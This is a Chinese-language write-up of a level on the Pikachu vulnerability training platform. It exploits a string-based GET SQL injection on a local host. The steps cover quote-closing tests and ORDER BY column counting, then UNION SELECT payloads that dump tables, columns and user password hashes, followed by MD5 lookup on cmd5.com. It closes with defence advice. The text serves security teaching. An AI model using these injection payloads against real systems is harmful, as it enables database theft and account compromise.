【Pikachu】Web-SQL-Inject 字符型注入(get) Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, 字符型注入, GET注入, union select, cmd5

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称：字符型注入(get)
  • 目标：利用GET请求中的字符型SQL注入漏洞，利用单引号闭合和注释符，获取数据库中的管理员账号和密码。

2. 解题思路与知识点

漏洞原理：

字符型SQL注入与数字型注入的最大区别在于：后端SQL语句中，变量被单引号（或双引号）包裹，类似于 SELECT * FROM users WHERE username = '$name'。因此，在构造攻击Payload时，必须首先闭合前面的单引号，然后使用注释符（如 --+）将原SQL语句后面的单引号注释掉，以保证语法正确。之后，方可利用逻辑判断、联合查询等方式窃取数据库中的敏感信息。

工具选型与心路历程：
  • F12抓包与地址栏注入：由于该关卡为GET请求，参数直接暴露在URL中。直接通过F12抓包明确参数名为 name，随后在浏览器地址栏手工构造URL进行注入测试，最为直观高效。
  • 闭合与注释技巧：掌握字符型注入的核心是闭合与注释。通过 vince' and 1=1 --+ 成功绕过限制。
  • 联合查询提取数据：利用 UNION SELECT 结合 information_schema 元数据库，逐层获取库名、表名、列名，最终提取账号与密码哈希。
  • MD5解密：获取到MD5哈希后，利用cmd5.com在线网站进行反向查询，还原明文密码。

3. 操作步骤

第一步：抓包与参数分析

操作：在页面输入框输入 vince，点击“查询”。按F12打开开发者工具，切换到网络（Network）标签页，观察抓到的请求。

分析结果：URL为 http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=vince&submit=查询。确认请求方式为GET，参数名为 name。

第二步：漏洞探测（单引号与布尔测试）

1. 单引号测试：在地址栏输入 name=vince' 访问。页面提示“您输入的username不存在，请重新输入！”说明单引号成功传入SQL语句并引起了闭合异常，注入点存在。

2. 布尔逻辑测试：构造闭合与注释Payload。在地址栏输入以下URL：

测试真条件： http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=vince' and 1=1 --+&submit=查询

页面正常回显 vince 的账号信息。

测试假条件： http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=vince' and 1=2 --+&submit=查询

页面提示“您输入的username不存在，请重新输入！”，证明漏洞可利用。

第三步：探测字段数（ORDER BY）

操作：在地址栏依次测试 order by 1、order by 2、order by 3：

测试： name=vince' order by 3 --+

结果：页面抛出数据库报错：Unknown column '3' in 'order clause'。

结论：推断后端SQL语句只查询了 2 个字段。

第四步：联合查询获取数据（UNION SELECT）

操作：利用联合查询，逐步获取库名、表名、列名及账号密码。

1. 查库名：

URL： ?name=vince' union select 1,database() --+&submit=查询

结果： 页面回显 your email is: pikachu，库名为 pikachu。

2. 查表名：

URL： ?name=vince' union select 1,group_concat(table_name) from information_schema.tables where table_schema='pikachu' --+&submit=查询

结果： 页面回显 httpinfo,member,message,users,xssblind。锁定目标表为 member。

3. 查列名：

URL： ?name=vince' union select 1,group_concat(column_name) from information_schema.columns where table_name='member' and table_schema='pikachu' --+&submit=查询

结果： 页面回显 id,username,pw,sex,phonenum,address,email。确认账号和密码字段为 username 和 pw。

4. 爆账号密码：

URL： ?name=vince' union select 1,group_concat(concat(username, ':', pw)) from member --+&submit=查询

结果： 页面回显 vince:e10adc3949ba59abbe56e057f20f883e,allen:e10adc...@hacker.com...，成功获取所有账号及其对应的MD5密码哈希值。

第五步：解密与验证

操作： 将提取到的哈希值 e10adc3949ba59abbe56e057f20f883e 粘贴到 cmd5.com 进行查询。

结果： 查询结果显示明文密码为 123456。说明后端使用了 MD5 加密且未加盐，且用户使用了极弱口令。

4. 踩坑记录与复盘

  • 坑1：空格与特殊字符被URL编码。在浏览器地址栏直接输入Payload时，空格、单引号、井号等字符会被浏览器自动编码（如 %27、%20）。这是正常现象，后端PHP会自动解码，并不会影响注入效果，但应确保注释符 --+ 被完整输入。
  • 坑2：字符型注入与数字型注入的区别。在数字型注入中，通过 id=0 union select... 直接拼接。但在字符型注入中，必须首先闭合前面的单引号（vince'），并注释后续单引号（--+），否则会出现语法错误（如未闭合的引号）。

5. 知识总结

  • 字符型注入核心：后端变量被单引号包裹时，Payload必须包含闭合引号（'）以及注释符（--+ 或 #）来截断原SQL语句的剩余部分。
  • UNION 联合查询：在知道字段数后，利用 UNION SELECT 结合 information_schema 数据库，按照“库 -> 表 -> 列 -> 数据”的顺序逐层提取，实现完整的“脱库”攻击。
  • 防御建议：严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与SQL语句代码分离；对用户输入进行严格的过滤和转义；对密码使用加盐的强哈希算法（如 bcrypt）进行存储。
